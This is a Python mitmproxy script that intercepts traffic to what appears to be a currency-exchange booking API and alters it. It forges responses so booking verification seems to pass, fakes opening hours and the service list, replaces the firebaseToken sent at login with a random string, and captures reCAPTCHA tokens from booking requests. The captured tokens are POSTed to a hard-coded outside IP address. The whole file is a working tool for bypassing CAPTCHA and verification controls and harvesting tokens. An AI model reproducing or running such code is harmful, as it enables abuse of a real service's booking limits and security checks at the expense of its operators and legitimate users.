from mitmproxy import http
import requests
import json
import random
import string


def send_token(token):
    """Send the captured Recaptchatoken to a specified endpoint."""
    url = 'http://143.47.230.152:3006/api/recaptcha/create'
    headers = {'Content-Type': 'application/json'}
    payload = {'Recaptchatoken': token}
    response = requests.post(url, json=payload, headers=headers)
    return response.text


def random_string(length):
    """Generate a random string of fixed length."""
    letters = string.ascii_letters + string.digits + ':_-'
    return ''.join(random.choice(letters) for i in range(length))


def response(flow: http.HTTPFlow):
    if "/api/services/app/Branch/GetAllOpenedBranches" in flow.request.pretty_url:
        data = json.loads(flow.response.content)
        # Check if the 'items' key is in the data and it is a list
        if 'items' in data['result'] and isinstance(data['result']['items'], list):
            for branch in data['result']['items']:
                # Set the working hours from 00:00 to 24:00
                branch['fromWorkHour'] = "00:00:00"
                branch['toWorkHour'] = "24:00:00"

            # Update the response with the modified data
            flow.response.text = json.dumps(data)

    elif "/api/services/app/ExchangeService/GetExchangeServiceForBooking" in flow.request.pretty_url:
        data = json.loads(flow.response.content)
        # This handles a single branch response
        # Set the work hours and service work hours from 00:00 to 24:00
        data['result']['fromWorkHour'] = "00:00:00"
        data['result']['toWorkHour'] = "24:00:00"
        data['result']['fromServiceWorkHour'] = "00:00:00"
        data['result']['toServiceWorkHour'] = "24:00:00"

        # Update the response with the modified data
        flow.response.text = json.dumps(data)


def request(flow: http.HTTPFlow):
    """Intercept specific API requests and return a custom JSON response, bypassing server processing."""
    if flow.request.pretty_url.endswith("/api/services/app/Booking/VerifyTravelerBooking"):
        # Create a custom JSON response to immediately return
        custom_json = b'{"result":true,"targetUrl":null,"success":true,"error":null,"unAuthorizedRequest":false,"__abp":true}'
        flow.response = http.Response.make(
            200,  # Status code
            custom_json,  # Response body
            {  # Response headers
                "Content-Type": "application/json; charset=utf-8",
                "Server": "nginx",
                "Date": "Mon, 29 Apr 2024 06:54:46 GMT",
                "Content-Length": str(len(custom_json)),
                "X-Content-Type-Options": "nosniff",
                "X-Xss-Protection": "1; mode=block",
                "X-Frame-Options": "SAMEORIGIN",
                "Strict-Transport-Security": "max-age=31536000",
                "Referrer-Policy": "strict-origin-when-cross-origin",
                "Permissions-Policy": "camera=(), microphone=(), geolocation=()"
            }
        )

    elif "/api/services/app/Booking/CreateBookingForTraveler" in flow.request.pretty_url:
        # Extract Recaptchatoken from the request headers
        recaptcha_token = flow.request.headers.get("Recaptchatoken", None)
        if recaptcha_token:
            # Send the token to another server
            result = send_token(recaptcha_token)
            print("Token sent, server responded with:", result)

        flow.kill()

    elif "/api/services/app/ExchangeService/GetAllOpenedExchangeServices" in flow.request.pretty_url:
        custom_response = b'{"result":[{"name":"Westren union","type":0,"isClosed":false,"isDisplay":true,"bookingNumberTimesPerMonth":3,"enableRecaptcha":false,"id":1},{"name":"Traveler","type":1,"isClosed":false,"isDisplay":true,"bookingNumberTimesPerMonth":1,"enableRecaptcha":true,"id":14}],"targetUrl":null,"success":true,"error":null,"unAuthorizedRequest":false,"__abp":true}'
        flow.response = http.Response.make(
            200,  # Status code
            custom_response,  # Response body
            {  # Response headers
                "Content-Type": "application/json; charset=utf-8",
                "Server": "nginx",
                "Date": "Mon, 29 Apr 2024 03:10:07 GMT",
                "Content-Length": str(len(custom_response)),
                "X-Content-Type-Options": "nosniff",
                "X-Xss-Protection": "1; mode=block",
                "X-Frame-Options": "SAMEORIGIN",
                "Strict-Transport-Security": "max-age=31536000",
                "Referrer-Policy": "strict-origin-when-cross-origin",
                "Permissions-Policy": "camera=(), microphone=(), geolocation=()"
            }
        )

    elif "/api/TokenAuth/AuthenticateCustomer" in flow.request.pretty_url:
        # Load the request data as JSON
        data = json.loads(flow.request.content)
        old_token = data['firebaseToken']
        new_token = random_string(162)
        data['firebaseToken'] = new_token
        # Update the request with the new data
        flow.request.text = json.dumps(data)
        print(f"Replaced firebaseToken: {old_token} with {new_token}")
